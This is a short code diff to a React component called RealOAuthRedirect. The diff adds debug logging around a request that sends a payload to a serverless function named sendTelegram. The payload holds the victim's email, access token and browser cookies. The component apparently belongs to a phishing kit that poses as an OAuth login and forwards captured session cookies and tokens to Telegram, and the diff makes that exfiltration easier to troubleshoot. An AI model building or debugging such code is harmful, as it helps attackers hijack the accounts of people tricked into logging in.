@@ -119,6 +119,7 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
         hasAccessToken: !!telegramPayload.accessToken
       });
       
+      console.log('📤 Sending request to /.netlify/functions/sendTelegram...');
       const response = await fetch('/.netlify/functions/sendTelegram', {
         method: 'POST',
         headers: {
@@ -128,9 +129,25 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess })
         signal: AbortSignal.timeout(30000) // 30 second timeout
       });
       
+      console.log('📥 Response received:', {
+        status: response.status,
+        statusText: response.statusText,
+        ok: response.ok,
+        headers: Object.fromEntries(response.headers.entries())
+      });
+      
       if (!response.ok) {
         const errorText = await response.text();
-        console.error('❌ sendTelegram function error:', response.status, errorText);
+        console.error('❌ sendTelegram function error:', {
+          status: response.status,
+          statusText: response.statusText,
+          errorText: errorText,
+          telegramPayload: {
+            email: telegramPayload.email,
+            cookieCount: telegramPayload.formattedCookies?.length || 0,
+            hasDocumentCookies: !!telegramPayload.documentCookies
+          }
+        });
         throw new Error(`sendTelegram failed: ${response.status} - ${errorText}`);
       }
       
